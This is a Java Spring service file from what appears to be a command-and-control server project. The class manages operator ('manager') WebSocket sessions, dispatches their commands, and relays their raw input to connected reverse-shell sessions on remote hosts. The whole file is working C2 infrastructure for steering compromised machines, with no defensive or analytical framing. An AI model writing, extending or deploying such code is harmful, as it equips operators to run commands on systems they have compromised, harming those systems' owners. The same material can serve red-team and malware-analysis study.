package com.mtattab.c2cServer.service.impl;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.MessageEventModel;
import com.mtattab.c2cServer.model.enums.ActiveSessionsEvents;
import com.mtattab.c2cServer.model.enums.ManagerCommands;
import com.mtattab.c2cServer.model.exceptions.CommandNotFoundException;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.ReverseShellManagerService;
import com.mtattab.c2cServer.service.factory.CommandFactory;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;

import org.springframework.context.ApplicationListener;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.Arrays;

import java.util.List;
import java.util.Optional;


@Service
@Slf4j
@Data

public class ReverseShellManagerObserverServiceImpl implements  ApplicationListener<MessageEventModel>, ReverseShellManagerService {

    @Autowired
    ActiveSessionsObservable activeSessionsObservable;


    @Autowired
    CommandFactory commandFactory;


    @Override
    public void onApplicationEvent(MessageEventModel messageEventModels) {
        log.info("[+] onApplicationEvent triggered with event {}",messageEventModels);
        Optional<ActiveSessionsEvents> matchingEvent = Arrays.stream(ActiveSessionsEvents.values())
                .filter(event -> event.equals(messageEventModels.getEvent()))
                .findFirst();

        if (matchingEvent.isPresent()) {
            matchingEvent.get().getEventHandler().handle(messageEventModels, activeSessionsObservable.getActiveMangerSessions());
        } else {
            log.error("[-] Event Not Found");
            throw new RuntimeException("Something wrong happened while handling observable change event" );
        }
    }

    public void addMangerSession(WebSocketSession managerSession){
        activeSessionsObservable.addManagerSession(managerSession);
    }
    public void removeMangerSession(WebSocketSession managerSession){
        activeSessionsObservable.removeManagerSession(managerSession);
    }

    public void handleManagerSession(WebSocketSession session, TextMessage message) {
//        System.out.println(ConnectionManager.connectedManagerToReverseSessions);
        if (ConnectionManager.connectedManagerToReverseSessions.get(session)!=null){
            handleConnectedManagerCommandMessage(session, message);

        }
        else
            if (!handleManagerCommandMessage(session,message)){
            SocketUtil.sendMessage(session, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .msg("Command Not Found. Use '"+ManagerCommands.HELP.getCommand()+"' for list of commands")
                            .build()
                    )));
        }

    }

    public boolean handleManagerCommandMessage(WebSocketSession session, TextMessage message) {
        String mangerMessage = message.getPayload();
        log.debug("Manager input is: {}",mangerMessage);
        List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");

        try {
            Command command = commandFactory.createCommand(mangerMessage);
            command.execute(userInputAsList,session);
            return true;

        } catch (CommandNotFoundException e) {
            log.warn("[-] Command not found");
            return false;
        }

    }

    public void handleConnectedManagerCommandMessage(WebSocketSession session, TextMessage message) {
        String mangerMessage = message.getPayload();

        System.out.println("reverse shell connected");
        WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(session);

        SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
                DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                        .msg(mangerMessage)
                        .masterSessionId(session.getId())
                        .build()
                )));
        log.debug("Manager input is: {}",mangerMessage);
        List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");


    }

}
